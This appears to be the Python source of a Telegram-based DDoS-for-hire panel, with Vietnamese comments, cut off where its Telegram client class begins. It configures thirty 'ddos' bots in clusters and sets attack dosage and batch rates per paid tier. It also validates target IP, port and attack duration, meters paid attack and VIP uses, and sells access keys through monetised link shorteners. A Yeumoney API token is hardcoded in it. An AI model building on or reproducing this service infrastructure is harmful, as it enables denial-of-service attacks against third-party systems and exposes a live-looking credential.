# ===================================================================
# BOTNET MANAGER + WEB KEY SERVICE - COMPLETE SOURCE CODE
# Version: 11.0 - SQLITE + BACKUP/RESTORE + VIP PRICE LIST + AUTO RESET + ACCESS TOKEN + AUTOCHECK
# ===================================================================

import asyncio
import logging
import time
import re
import random
import json
import os
import socket
import secrets
import threading
import sqlite3
import hashlib
import hmac
import base64
import requests
import urllib.parse
from datetime import datetime, timedelta
from typing import Dict, List, Set, Optional, Tuple
from collections import deque

from dotenv import load_dotenv
load_dotenv()

# ---- Bot quản lý (Token bot) ----
BOT_TOKEN = os.getenv("BOT_TOKEN")

# ---- User client (Telethon) ----
API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH")
PHONE_NUMBER = os.getenv("PHONE_NUMBER")

# ---- Admin ----
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))

# ---- Cấu hình nhóm ----
MAIN_GROUP_ID = int(os.getenv("MAIN_GROUP_ID", 0))
LOG_GROUP_ID = int(os.getenv("LOG_GROUP_ID", 0))
LOGV_GROUP_ID = int(os.getenv("LOGV_GROUP_ID", 0))
LOGM_GROUP_ID = int(os.getenv("LOGM_GROUP_ID", 0))
BOT_MOTHER_GROUP_ID_1 = int(os.getenv("BOT_MOTHER_GROUP_ID_1", 0))
BOT_MOTHER_GROUP_ID_2 = int(os.getenv("BOT_MOTHER_GROUP_ID_2", 0))
BOT_MOTHER_GROUP_ID_3 = int(os.getenv("BOT_MOTHER_GROUP_ID_3", 0))

# ---- Web key ----
WEBKEY_DOMAIN = os.getenv("WEBKEY_DOMAIN", "https://getkey-6p93.onrender.com")
WEBKEY_URL = f"{WEBKEY_DOMAIN}/"

# ---- Link4m API ----
LINK4M_API_TOKEN = os.getenv("LINK4M_API_TOKEN", "")
LINK4M_API_URL = os.getenv("LINK4M_API_URL", "https://link4m.co/api-shorten/v2")

# ---- Yeumoney API ----
YEUMONEY_API_TOKEN = "f3882774cc68bedc3f728611357f36371b64e569c5e5211b08e6b5c4ee419ed8"
YEUMONEY_API_URL = "https://yeumoney.com/QL_api.php"

# ---- Flask port ----
PORT = int(os.getenv("PORT", 5000))

# ---- Secret key ----
SECRET_KEY = os.getenv("SECRET_KEY", secrets.token_urlsafe(32))

# ---- Admin profile ----
ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "")

# ---- Database ----
DATABASE_FILE = "database.db"

# ===================================================================
# CẤU HÌNH CHUNG
# ===================================================================

DOSAGE_CONFIG = {"attack": 1, "vip": 4, "max": 20}

BATCH_CONFIG = {
    "attack": {"batch_size": 1, "batch_delay": 0},
    "vip": {"batch_size": 4, "batch_delay": 0},
    "max": {"batch_size": 10, "batch_delay": 1.5},
    "autocheck": {"batch_size": 10, "batch_delay": 1.0}
}

RESPONSE_TIMEOUT = 7
STATUS_CHECK_TIMEOUT = 10
COOLDOWN_TIME = 25
RESET_WAIT_TIME = 60

MAX_HISTORY = 100

DEFAULT_RETRIES = 5

KEY_LENGTH = 8
KEY_PREFIX = "KEY"
KEY_USES = 1
GETKEY_LIMIT_PER_SERVICE = 2
GETKEY_WINDOW = 86400

# ===================================================================
# DANH SÁCH BOT CON THEO CỤM
# ===================================================================

BOT_MOTHER_1_BOTS = [
    "ddos2_bot", "ddos_hnam3_bot", "ddos_bot4_bot", "bot_ddos5_bot",
    "bot_ddos6_bot", "bot_ddos7_bot", "bot_ddos8_bot", "bot_ddos9_bot",
    "bot_ddos10_bot", "bot_ddos11_bot"
]

BOT_MOTHER_2_BOTS = [
    "bot_ddos12_bot", "bot_ddos13hn_bot", "bot_ddos14hn_bot", "bot_ddos15hn_bot",
    "bot_ddos16hn_bot", "bot_ddos17hn_bot", "bot_ddos18hn_bot", "bot_ddos19hn_bot",
    "bot_ddos20hn_bot", "bot_ddos21hn_bot"
]

BOT_MOTHER_3_BOTS = [
    "bot_ddos22hn_bot", "bot_ddos23hn_bot", "bot_ddos24hn_bot", "bot_ddos25hn_bot",
    "bot_ddos26hn_bot", "bot_ddos27hn_bot", "bot_ddos28hn_bot", "bot_ddos29hn_bot",
    "bot_ddos30hn_bot", "bot_ddos31hn_bot"
]

ALL_BOTS = BOT_MOTHER_1_BOTS + BOT_MOTHER_2_BOTS + BOT_MOTHER_3_BOTS

BOT_DISPLAY_MAPPING = {
    "ddos2_bot": "bot2", "ddos_hnam3_bot": "bot3", "ddos_bot4_bot": "bot4",
    "bot_ddos5_bot": "bot5", "bot_ddos6_bot": "bot6", "bot_ddos7_bot": "bot7",
    "bot_ddos8_bot": "bot8", "bot_ddos9_bot": "bot9", "bot_ddos10_bot": "bot10",
    "bot_ddos11_bot": "bot11",
    "bot_ddos12_bot": "bot12", "bot_ddos13hn_bot": "bot13", "bot_ddos14hn_bot": "bot14",
    "bot_ddos15hn_bot": "bot15", "bot_ddos16hn_bot": "bot16", "bot_ddos17hn_bot": "bot17",
    "bot_ddos18hn_bot": "bot18", "bot_ddos19hn_bot": "bot19", "bot_ddos20hn_bot": "bot20",
    "bot_ddos21hn_bot": "bot21",
    "bot_ddos22hn_bot": "bot22", "bot_ddos23hn_bot": "bot23", "bot_ddos24hn_bot": "bot24",
    "bot_ddos25hn_bot": "bot25", "bot_ddos26hn_bot": "bot26", "bot_ddos27hn_bot": "bot27",
    "bot_ddos28hn_bot": "bot28", "bot_ddos29hn_bot": "bot29", "bot_ddos30hn_bot": "bot30",
    "bot_ddos31hn_bot": "bot31",
}

# ===================================================================
# CẤU HÌNH NHÓM CŨ
# ===================================================================

GROUP_MAPPING = {
    "-1003754227535": {"name": "Nhóm 1", "bots": ["ddos2_bot", "ddos_hnam3_bot"], "display": "bot2, bot3", "order": 1},
    "-1004499384100": {"name": "Nhóm 2", "bots": ["ddos_bot4_bot", "bot_ddos5_bot"], "display": "bot4, bot5", "order": 2},
    "-1004476618635": {"name": "Nhóm 3", "bots": ["bot_ddos6_bot", "bot_ddos7_bot"], "display": "bot6, bot7", "order": 3},
    "-1003776655955": {"name": "Nhóm 4", "bots": ["bot_ddos8_bot", "bot_ddos9_bot"], "display": "bot8, bot9", "order": 4},
    "-1004355617899": {"name": "Nhóm 5", "bots": ["bot_ddos10_bot", "bot_ddos11_bot"], "display": "bot10, bot11", "order": 5},
    "-1004311149534": {"name": "Nhóm 6", "bots": ["bot_ddos12_bot", "bot_ddos13hn_bot"], "display": "bot12, bot13", "order": 6},
    "-1004496252706": {"name": "Nhóm 7", "bots": ["bot_ddos14hn_bot", "bot_ddos15hn_bot"], "display": "bot14, bot15", "order": 7},
    "-1003934135828": {"name": "Nhóm 8", "bots": ["bot_ddos16hn_bot", "bot_ddos17hn_bot"], "display": "bot16, bot17", "order": 8},
    "-1003935351804": {"name": "Nhóm 9", "bots": ["bot_ddos18hn_bot", "bot_ddos19hn_bot"], "display": "bot18, bot19", "order": 9},
    "-1003730895867": {"name": "Nhóm 10", "bots": ["bot_ddos20hn_bot", "bot_ddos21hn_bot"], "display": "bot20, bot21", "order": 10}
}

BOT_GROUP_ORDER = list(GROUP_MAPPING.keys())

# ===================================================================
# SHORTENER SERVICES
# ===================================================================

SHORTENER_SERVICES = {
    "link4m": {
        "name": "Link4m",
        "api_url": LINK4M_API_URL,
        "api_token": LINK4M_API_TOKEN,
        "icon": "🔗",
        "color": "#00ff88"
    },
    "yeumoney": {
        "name": "Yeumoney",
        "api_url": YEUMONEY_API_URL,
        "api_token": YEUMONEY_API_TOKEN,
        "icon": "💰",
        "color": "#ffd700"
    }
}

# ===================================================================
# DATABASE (SQLITE) - INIT + CRUD
# ===================================================================

def get_db_connection():
    conn = sqlite3.connect(DATABASE_FILE, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_database():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keys (
            key TEXT PRIMARY KEY,
            uses_left INTEGER DEFAULT 1,
            status TEXT DEFAULT 'ACTIVE',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute("PRAGMA table_info(keys)")
    columns = [col[1] for col in cursor.fetchall()]
    if 'access_token' not in columns:
        cursor.execute('ALTER TABLE keys ADD COLUMN access_token TEXT')
        cursor.execute('CREATE UNIQUE INDEX IF NOT EXISTS idx_access_token ON keys(access_token) WHERE access_token IS NOT NULL')
    if 'token_used' not in columns:
        cursor.execute('ALTER TABLE keys ADD COLUMN token_used INTEGER DEFAULT 0')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS op_state (
            id INTEGER PRIMARY KEY CHECK (id = 1),
            mother_1 BOOLEAN DEFAULT FALSE,
            mother_2 BOOLEAN DEFAULT FALSE,
            mother_3 BOOLEAN DEFAULT FALSE,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute("PRAGMA table_info(op_state)")
    columns = [col[1] for col in cursor.fetchall()]
    if 'auto_reset' not in columns:
        cursor.execute('ALTER TABLE op_state ADD COLUMN auto_reset INTEGER DEFAULT 0')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_usage (
            user_id INTEGER PRIMARY KEY,
            attack_uses INTEGER DEFAULT 0,
            vip_uses INTEGER DEFAULT 0,
            vip_name TEXT DEFAULT '',
            last_used TIMESTAMP,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS getkey_usage (
            user_id INTEGER,
            service_id TEXT,
            date TEXT,
            count INTEGER DEFAULT 0,
            PRIMARY KEY (user_id, service_id, date)
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS permissions (
            user_id INTEGER,
            command TEXT,
            PRIMARY KEY (user_id, command)
        )
    ''')
    
    cursor.execute('SELECT * FROM op_state WHERE id = 1')
    if not cursor.fetchone():
        cursor.execute('''
            INSERT INTO op_state (id, mother_1, mother_2, mother_3, auto_reset)
            VALUES (1, FALSE, FALSE, FALSE, 0)
        ''')
    conn.commit()
    conn.close()
    logging.info("SQLite database initialized")

def create_key_record(key: str, token: str) -> bool:
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('INSERT INTO keys (key, uses_left, status, access_token, token_used) VALUES (?, ?, ?, ?, ?)', 
                       (key, KEY_USES, 'ACTIVE', token, 0))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logging.error(f"create_key_record error: {e}")
        return False

def get_key_info(key: str) -> Optional[Dict]:
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM keys WHERE key = ?', (key,))
        row = cursor.fetchone()
        conn.close()
        if row:
            return dict(row)
        return None
    except Exception as e:
        logging.error(f"get_key_info error: {e}")
        return None

def get_key_by_token(token: str) -> Optional[Dict]:
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT key, uses_left, status FROM keys WHERE access_token = ?', (token,))
        row = cursor.fetchone()
        conn.close()
        if row:
            return dict(row)
        return None
    except Exception as e:
        logging.error(f"get_key_by_token error: {e}")
        return None

def use_key(key: str) -> bool:
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT uses_left FROM keys WHERE key = ?', (key,))
        row = cursor.fetchone()
        if not row or row['uses_left'] <= 0:
            conn.close()
            return False
        new_uses = row['uses_left'] - 1
        status = 'EXPIRED' if new_uses <= 0 else 'ACTIVE'
        cursor.execute('UPDATE keys SET uses_left = ?, status = ?, updated_at = CURRENT_TIMESTAMP WHERE key = ?', (new_uses, status, key))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logging.error(f"use_key error: {e}")
        return False

def is_key_valid(key: str) -> bool:
    info = get_key_info(key)
    if not info:
        return False
    return info.get('status') == 'ACTIVE' and info.get('uses_left', 0) > 0

def is_key_exists(key: str) -> bool:
    return get_key_info(key) is not None

def get_op_state() -> Dict[str, bool]:
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT mother_1, mother_2, mother_3, auto_reset FROM op_state WHERE id = 1')
        row = cursor.fetchone()
        conn.close()
        if row:
            return {
                "mother_1": bool(row['mother_1']),
                "mother_2": bool(row['mother_2']),
                "mother_3": bool(row['mother_3']),
                "auto_reset": bool(row['auto_reset'] if row['auto_reset'] is not None else 0)
            }
        return {"mother_1": False, "mother_2": False, "mother_3": False, "auto_reset": False}
    except Exception as e:
        logging.error(f"get_op_state error: {e}")
        return {"mother_1": False, "mother_2": False, "mother_3": False, "auto_reset": False}

def set_op_state(mother_1: bool, mother_2: bool, mother_3: bool, auto_reset: Optional[bool] = None) -> bool:
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        if auto_reset is None:
            cursor.execute('SELECT auto_reset FROM op_state WHERE id = 1')
            row = cursor.fetchone()
            current_auto = bool(row['auto_reset']) if row and row['auto_reset'] is not None else False
        else:
            current_auto = auto_reset
        
        cursor.execute('''
            INSERT INTO op_state (id, mother_1, mother_2, mother_3, auto_reset, updated_at)
            VALUES (1, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(id) DO UPDATE SET 
                mother_1 = excluded.mother_1,
                mother_2 = excluded.mother_2,
                mother_3 = excluded.mother_3,
                auto_reset = excluded.auto_reset,
                updated_at = CURRENT_TIMESTAMP
        ''', (1 if mother_1 else 0, 1 if mother_2 else 0, 1 if mother_3 else 0, 1 if current_auto else 0))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logging.error(f"set_op_state error: {e}")
        return False

# ---- EXPORT / IMPORT DATA ----
def export_all_data() -> Dict:
    data = {}
    conn = get_db_connection()
    cursor = conn.cursor()
    for table in ['keys', 'op_state', 'user_usage', 'getkey_usage', 'permissions']:
        cursor.execute(f'SELECT * FROM {table}')
        rows = cursor.fetchall()
        data[table] = [dict(row) for row in rows]
    conn.close()
    return data

def import_all_data(data: Dict) -> bool:
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        for table in ['keys', 'user_usage', 'getkey_usage', 'permissions', 'op_state']:
            cursor.execute(f'DELETE FROM {table}')
        for table, rows in data.items():
            if not rows:
                continue
            columns = list(rows[0].keys())
            placeholders = ','.join(['?' for _ in columns])
            colnames = ','.join(columns)
            for row in rows:
                values = [row[col] for col in columns]
                cursor.execute(f'INSERT INTO {table} ({colnames}) VALUES ({placeholders})', values)
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logging.error(f"import_all_data error: {e}")
        return False

# ===================================================================
# USER MANAGER (SQLITE)
# ===================================================================

class UserManager:
    def __init__(self, user_client=None):
        self.user_client = user_client

    def load_from_database(self) -> List[Dict]:
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT user_id, attack_uses FROM user_usage WHERE attack_uses > 0')
            rows = cursor.fetchall()
            conn.close()
            return [dict(row) for row in rows]
        except Exception:
            return []

    def get_user(self, user_id: int) -> Dict:
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM user_usage WHERE user_id = ?', (user_id,))
            row = cursor.fetchone()
            if row:
                result = dict(row)
                conn.close()
                return result
            else:
                cursor.execute('INSERT INTO user_usage (user_id, attack_uses, vip_uses) VALUES (?, 0, 0)', (user_id,))
                conn.commit()
                conn.close()
                return {"user_id": user_id, "attack_uses": 0, "vip_uses": 0, "vip_name": ""}
        except Exception as e:
            logging.error(f"get_user error: {e}")
            return {"user_id": user_id, "attack_uses": 0, "vip_uses": 0, "vip_name": ""}

    def add_attack_uses(self, user_id: int, amount: int):
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT attack_uses FROM user_usage WHERE user_id = ?', (user_id,))
            row = cursor.fetchone()
            current = row['attack_uses'] if row else 0
            new_amount = current + amount
            cursor.execute('''
                INSERT INTO user_usage (user_id, attack_uses, created_at)
                VALUES (?, ?, CURRENT_TIMESTAMP)
                ON CONFLICT(user_id) DO UPDATE SET attack_uses = excluded.attack_uses, updated_at = CURRENT_TIMESTAMP
            ''', (user_id, new_amount))
            conn.commit()
            conn.close()
            if self.user_client:
                try:
                    chat = self.user_client.client.get_entity(user_id)
                    name = chat.first_name or "Không có tên"
                except:
                    name = "Không tìm thấy"
                log_msg = f"/sdattack {user_id} {name} {new_amount}"
                asyncio.create_task(self.user_client.client.send_message(int(LOGV_GROUP_ID), log_msg))
        except Exception as e:
            logging.error(f"add_attack_uses error: {e}")

    def get_attack_uses(self, user_id: int) -> int:
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT attack_uses FROM user_usage WHERE user_id = ?', (user_id,))
            row = cursor.fetchone()
            conn.close()
            return row['attack_uses'] if row else 0
        except Exception:
            return 0

    def use_attack(self, user_id: int) -> bool:
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT attack_uses FROM user_usage WHERE user_id = ?', (user_id,))
            row = cursor.fetchone()
            if not row or row['attack_uses'] <= 0:
                conn.close()
                return False
            new_uses = row['attack_uses'] - 1
            cursor.execute('UPDATE user_usage SET attack_uses = ?, last_used = CURRENT_TIMESTAMP, updated_at = CURRENT_TIMESTAMP WHERE user_id = ?', (new_uses, user_id))
            conn.commit()
            conn.close()
            if self.user_client:
                try:
                    chat = self.user_client.client.get_entity(user_id)
                    name = chat.first_name or "Không có tên"
                except:
                    name = "Không tìm thấy"
                log_msg = f"/sdattack {user_id} {name} {new_uses}"
                asyncio.create_task(self.user_client.client.send_message(int(LOGV_GROUP_ID), log_msg))
            return True
        except Exception as e:
            logging.error(f"use_attack error: {e}")
            return False

    def has_attack_uses(self, user_id: int) -> bool:
        return self.get_attack_uses(user_id) > 0

    def can_getkey(self, user_id: int, service_id: str) -> Tuple[bool, int]:
        today = datetime.now().strftime('%Y-%m-%d')
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT count FROM getkey_usage WHERE user_id=? AND service_id=? AND date=?', (user_id, service_id, today))
            row = cursor.fetchone()
            used = row['count'] if row else 0
            remaining = max(0, GETKEY_LIMIT_PER_SERVICE - used)
            conn.close()
            return remaining > 0, remaining
        except Exception:
            return True, GETKEY_LIMIT_PER_SERVICE

    def get_remaining_count(self, user_id: int, service_id: str) -> int:
        _, remaining = self.can_getkey(user_id, service_id)
        return remaining

    def add_getkey_record(self, user_id: int, service_id: str):
        today = datetime.now().strftime('%Y-%m-%d')
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT count FROM getkey_usage WHERE user_id=? AND service_id=? AND date=?', (user_id, service_id, today))
            row = cursor.fetchone()
            if row:
                new_count = row['count'] + 1
                cursor.execute('UPDATE getkey_usage SET count = ? WHERE user_id=? AND service_id=? AND date=?', (new_count, user_id, service_id, today))
            else:
                cursor.execute('INSERT INTO getkey_usage (user_id, service_id, date, count) VALUES (?, ?, ?, 1)', (user_id, service_id, today))
            conn.commit()
            conn.close()
        except Exception as e:
            logging.error(f"add_getkey_record error: {e}")

# ===================================================================
# VIP MANAGER (SQLITE)
# ===================================================================

class VipManager:
    def __init__(self, user_client=None):
        self.user_client = user_client

    def load_from_database(self) -> List[Dict]:
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT user_id, vip_uses, vip_name FROM user_usage WHERE vip_uses > 0')
            rows = cursor.fetchall()
            conn.close()
            return [dict(row) for row in rows]
        except Exception:
            return []

    def add_uses(self, user_id: int, name: str, amount: int) -> int:
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT vip_uses FROM user_usage WHERE user_id = ?', (user_id,))
            row = cursor.fetchone()
            current = row['vip_uses'] if row else 0
            new_uses = current + amount
            cursor.execute('''
                INSERT INTO user_usage (user_id, vip_uses, vip_name, created_at)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP)
                ON CONFLICT(user_id) DO UPDATE SET vip_uses = excluded.vip_uses, vip_name = excluded.vip_name, updated_at = CURRENT_TIMESTAMP
            ''', (user_id, new_uses, name))
            conn.commit()
            conn.close()
            if self.user_client:
                log_msg = f"/sdvip {user_id} {name} {new_uses}"
                asyncio.create_task(self.user_client.client.send_message(int(LOGV_GROUP_ID), log_msg))
            return new_uses
        except Exception as e:
            logging.error(f"add_vip_uses error: {e}")
            return 0

    def use_vip(self, user_id: int) -> Optional[int]:
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT vip_uses, vip_name FROM user_usage WHERE user_id = ?', (user_id,))
            row = cursor.fetchone()
            if not row or row['vip_uses'] <= 0:
                conn.close()
                return None
            new_uses = row['vip_uses'] - 1
            name = row['vip_name'] or "Không tìm thấy"
            cursor.execute('UPDATE user_usage SET vip_uses = ?, last_used = CURRENT_TIMESTAMP, updated_at = CURRENT_TIMESTAMP WHERE user_id = ?', (new_uses, user_id))
            conn.commit()
            conn.close()
            if self.user_client:
                log_msg = f"/sdvip {user_id} {name} {new_uses}"
                asyncio.create_task(self.user_client.client.send_message(int(LOGV_GROUP_ID), log_msg))
            return new_uses
        except Exception as e:
            logging.error(f"use_vip error: {e}")
            return None

    def get_remaining(self, user_id: int) -> int:
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT vip_uses FROM user_usage WHERE user_id = ?', (user_id,))
            row = cursor.fetchone()
            conn.close()
            return row['vip_uses'] if row else 0
        except Exception:
            return 0

    def has_uses(self, user_id: int) -> bool:
        return self.get_remaining(user_id) > 0

    def get_name(self, user_id: int) -> str:
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT vip_name FROM user_usage WHERE user_id = ?', (user_id,))
            row = cursor.fetchone()
            conn.close()
            return row['vip_name'] if row and row['vip_name'] else "Không tìm thấy"
        except Exception:
            return "Không tìm thấy"

# ===================================================================
# PERMISSION MANAGER (SQLITE)
# ===================================================================

class PermissionManager:
    def __init__(self, filename: str = None):
        pass

    def has_permission(self, user_id: int, command: str) -> bool:
        if user_id == ADMIN_ID:
            return True
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT 1 FROM permissions WHERE user_id = ? AND command = ?', (user_id, command))
            exists = cursor.fetchone() is not None
            conn.close()
            return exists
        except Exception:
            return False

    def add_permission(self, user_id: int, command: str) -> bool:
        if user_id == ADMIN_ID:
            return False
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('INSERT INTO permissions (user_id, command) VALUES (?, ?)', (user_id, command))
            conn.commit()
            conn.close()
            return True
        except Exception:
            return False

    def remove_permission(self, user_id: int) -> bool:
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('DELETE FROM permissions WHERE user_id = ?', (user_id,))
            conn.commit()
            conn.close()
            return True
        except Exception:
            return False

    def get_users(self, command: str) -> List[int]:
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT user_id FROM permissions WHERE command = ?', (command,))
            rows = cursor.fetchall()
            conn.close()
            return [row['user_id'] for row in rows]
        except Exception:
            return []

# ===================================================================
# BOT STATE
# ===================================================================

class BotManagerState:
    def __init__(self):
        self.command_history: deque = deque(maxlen=MAX_HISTORY)
        self.current_group_index: int = 0
        self.bot_cooldown: Dict[str, float] = {}
        self.pending_reset: Dict[str, float] = {}
        self.is_off: bool = False
        self.pending_attacks: Dict[int, Dict] = {}
        self.can_send_mother_1: bool = False
        self.can_send_mother_2: bool = False
        self.can_send_mother_3: bool = False
        self.status_check_results: Dict[int, Dict] = {}
        self.pending_reset_confirm: Dict[str, Dict] = {}
        self.auto_reset: bool = False
        self.autocheck_all: bool = False
        self.autocheck_only: bool = False
        self.autocheck_reported_offline: Set[str] = set()
        self.autocheck_pending_confirm: Dict[str, Dict] = {}

    def is_bot_available(self, bot_username: str) -> bool:
        if bot_username in self.pending_reset:
            return False
        if bot_username not in self.bot_cooldown:
            return True
        return time.time() >= self.bot_cooldown[bot_username]

    def mark_bot_used(self, bot_username: str, cooldown_time: int = 35):
        self.bot_cooldown[bot_username] = time.time() + cooldown_time
        logging.info(f"⏳ Bot {bot_username} cooldown {cooldown_time}s")

    def get_cooldown_remaining(self, bot_username: str) -> int:
        if bot_username not in self.bot_cooldown:
            return 0
        remaining = self.bot_cooldown[bot_username] - time.time()
        return max(0, int(remaining))

    def mark_bot_reset(self, bot_username: str):
        self.pending_reset[bot_username] = time.time()
        if bot_username in self.bot_cooldown:
            del self.bot_cooldown[bot_username]

    def cleanup_reset_bots(self):
        now = time.time()
        to_remove = [bot for bot, start in self.pending_reset.items() if now - start > RESET_WAIT_TIME]
        for bot in to_remove:
            del self.pending_reset[bot]
            logging.info(f"Bot {bot} đã reset xong")

    def get_available_bots_by_cluster(self) -> List[str]:
        available_bots = []
        if self.can_send_mother_1:
            available_bots.extend(BOT_MOTHER_1_BOTS)
        if self.can_send_mother_2:
            available_bots.extend(BOT_MOTHER_2_BOTS)
        if self.can_send_mother_3:
            available_bots.extend(BOT_MOTHER_3_BOTS)
        return available_bots

    def get_available_count(self) -> int:
        count = 0
        for bot in self.get_available_bots_by_cluster():
            if self.is_bot_available(bot):
                count += 1
        return count

state = BotManagerState()

# ===================================================================
# VALIDATION
# ===================================================================

def validate_ip(ip: str) -> tuple:
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if not re.match(pattern, ip):
        return False, "IP không hợp lệ. Vui lòng kiểm tra lại."
    parts = ip.split('.')
    for part in parts:
        if not part.isdigit():
            return False, "IP không hợp lệ. Vui lòng kiểm tra lại."
        num = int(part)
        if num < 0 or num > 255:
            return False, "IP không hợp lệ. Vui lòng kiểm tra lại."
    return True, ""

def validate_port(port: str) -> tuple:
    if not port.isdigit():
        return False, "Port không hợp lệ. Vui lòng kiểm tra lại."
    num = int(port)
    if num < 1 or num > 65535:
        return False, "Port không hợp lệ. Vui lòng kiểm tra lại."
    return True, ""

def validate_time(time_str: str, max_value: int = None) -> tuple:
    if not time_str.isdigit():
        return False, "Thời gian không hợp lệ. Vui lòng kiểm tra lại."
    num = int(time_str)
    if num < 1:
        return False, "Thời gian không hợp lệ. Vui lòng kiểm tra lại."
    if max_value is not None and num > max_value:
        return False, f"Thời gian không được vượt quá {max_value} giây."
    return True, ""

def validate_args(args: list, expected_count: int) -> tuple:
    if len(args) != expected_count:
        return False, "Sai cú pháp. Vui lòng kiểm tra lại."
    return True, ""

# ===================================================================
# LOG QUEUE MANAGER
# ===================================================================

class LogQueueManager:
    def __init__(self):
        self.queue: asyncio.Queue = asyncio.Queue()
        self.pending_attacks: Dict[int, Dict] = {}
    
    async def put_log(self, log_data: Dict):
        await self.queue.put(log_data)
        logging.info(f"📨 Đã đưa log vào queue: {log_data.get('action')} - {log_data.get('bot_display', 'unknown')}")
    
    async def get_log(self) -> Dict:
        return await self.queue.get()
    
    def add_pending_attack(self, pending_key: int, attack_data: Dict):
        self.pending_attacks[pending_key] = attack_data
        logging.info(f"📊 Đã thêm pending attack {pending_key} vào queue manager")
    
    def get_pending_attack(self, pending_key: int) -> Optional[Dict]:
        return self.pending_attacks.get(pending_key)
    
    def remove_pending_attack(self, pending_key: int):
        if pending_key in self.pending_attacks:
            del self.pending_attacks[pending_key]
            logging.info(f"📊 Đã xóa pending attack {pending_key} khỏi queue manager")

log_queue_manager = LogQueueManager()

# ===================================================================
# SHORTENER SERVICES (hàm)
# ===================================================================

def shorten_with_link4m(destination_url: str) -> Optional[str]:
    if not LINK4M_API_TOKEN:
        logging.warning("LINK4M_API_TOKEN not configured")
        return None
    try:
        params = {"api": LINK4M_API_TOKEN, "url": destination_url}
        response = requests.get(LINK4M_API_URL, params=params, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                short_url = data.get("shortenedUrl")
                if short_url:
                    return short_url
        return None
    except Exception as e:
        logging.error(f"Link4m API exception: {e}")
        return None

def shorten_with_yeumoney(destination_url: str) -> Optional[str]:
    try:
        params = {"token": YEUMONEY_API_TOKEN, "format": "json", "url": destination_url}
        response = requests.get(YEUMONEY_API_URL, params=params, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                short_url = data.get("shortenedUrl")
                if short_url:
                    short_url = short_url.replace('\\/', '/')
                    return short_url
        return None
    except Exception as e:
        logging.error(f"Yeumoney API exception: {e}")
        return None

def shorten_url(service: str, url: str) -> Optional[str]:
    if service == "link4m":
        return shorten_with_link4m(url)
    elif service == "yeumoney":
        return shorten_with_yeumoney(url)
    return None

def generate_key_and_token() -> Tuple[str, str]:
    import secrets
    max_attempts = 10
    for _ in range(max_attempts):
        random_part = secrets.token_hex(8)
        key = f"{KEY_PREFIX}-{random_part}"
        token = secrets.token_hex(16)
        if not is_key_exists(key):
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT 1 FROM keys WHERE access_token = ?', (token,))
            exists = cursor.fetchone() is not None
            conn.close()
            if not exists:
                return key, token
    timestamp = int(time.time()) % 10000
    random_part = secrets.token_hex(6) + f"{timestamp:04d}"
    key = f"{KEY_PREFIX}-{random_part}"
    token = secrets.token_hex(16)
    return key, token

# ===================================================================
# TELEGRAM USER CLIENT
# ===================================================================

import socket
socket.setdefaulttimeout(5)

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from telegram.request import HTTPXRequest
from telegram.error import TimedOut, RetryAfter, NetworkError
from httpx import ConnectError

from telethon import TelegramClient, events
from telethon.errors import FloodWaitError, UsernameNotOccupiedError

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class TelegramUserClient:
